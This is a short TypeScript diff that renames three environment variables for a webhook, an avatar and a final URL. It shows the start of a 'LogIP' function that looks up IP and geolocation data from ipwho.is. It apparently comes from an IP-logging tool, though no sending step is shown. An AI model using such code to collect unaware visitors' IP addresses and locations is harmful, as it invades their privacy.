@@ -1,6 +1,6 @@
-const webhookURL = process.env.webhookURL || '';
-const avatarURL = process.env.avatarURL || '';
-const finalURL = process.env.finalURL || '';
+const webhookURL = process.env.WEBHOOK_URL || '';
+const avatarURL = process.env.AVATAR_URL || '';
+const finalURL = process.env.FINAL_URL || '';
 
 export const LogIP = async (baseURL: string) => {
     const data = await (await fetch('https://ipwho.is')).json();
